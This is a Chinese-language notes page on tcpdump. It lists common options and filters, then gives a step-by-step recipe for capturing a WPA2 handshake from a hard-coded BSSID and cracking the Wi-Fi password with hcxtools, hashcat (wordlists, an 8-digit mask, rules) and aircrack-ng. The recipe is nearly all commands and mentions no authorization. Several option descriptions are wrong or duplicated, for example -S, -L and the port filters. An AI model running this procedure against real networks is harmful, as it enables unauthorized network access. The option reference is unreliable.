#  Tcpdump
{docsify-updated}

- [Tcpdump](#tcpdump)
  - [常用参数](#常用参数)
  - [Wifi Mac 帧](#wifi-mac-帧)

### 常用参数
+ `-c [count]`: 抓取指定数量的包
+ `-i [interface]`: 指定要抓包的接口,如果-i 后没有加接口，默认抓取所有接口的流量
+ `-L`: 设置为监听模式，只支持IEEE 802.11 Wi-Fi 接口，并且只支持一些操作系统
+ `-w [file]`: 指定将抓包数据写入一个文件而不是打印出来, `tcpdump port 80 -w capture_file`
+ `-U`: 指定缓存，如果设置了-w，那么抓包数据会立即写入文件，没有指定-w，数据会被缓存然后输出
+ `-X`: 以十六进制格式输出
+ `-S`: 抓取整个包
+ `-nn`: 不解析主机名或端口名
+ `-vvv`: 输出更多
+ `host [ip]`: 过滤指定IP的包
+ `src [ip]`: 根据源地址过滤
+ `dst [ip]`: 根据目的地址过滤
+ `port [port]`: 查看指定端口的流量
+ `src port [port]`: 查看指定源端口的流量, `tcpdump port 8050`
+ `dst port [port]`: 查看指定目的端口的流量， `tcpdump src port 8050`
+ `dst port [port]`: 查看指定目的端口的流量， `tcpdump dst port 8050`
+ `tcpdump [protocol]`: 查看指定协议的流量，`tcpdump icmp`


### Wifi Mac 帧
<center><img src="pics/wifi-frame.jpg" width="60%"></center>

软件安装：
+ brew install hashcat
+ brew install hcxtools
+ brew install wireshark

1. export BSSID=18:9e:2c:64:88:3c
2. networksetup -listallhardwareports
3. sudo airport -z
4. sudo airport -c153
5. sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en0 -w beacon.cap
6. sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap
7. mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
8. hcxpcapngtool -o hashfile capture.cap
9. hashcat -m 22000 hashfile wpa2-wordlists/full.txt
10. hashcat -m 22000 -a3 capture.hccapx "?d?d?d?d?d?d?d?d"
11. hashcat -m 22000 hashfile wpa.txt -r Probable-Wordlists/Analysis-Files/ProbWL-547-rule-probable-v2.rule

https://hashcat.net/cap2hashcat/

aircrack-ng -1 -a 1 -b 18:9e:2c:64:88:3c 


1. Install aircrack-ng:`brew install aircrack-ng`
2. `sudo airport -s`
3. `sudo airport en1 sniff [CHANNEL]`
4. New Terminal Window: `aircrack-ng -1 -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE]`
// Notes: the cap_file will be located in the /tmp/airportSniff*.cap.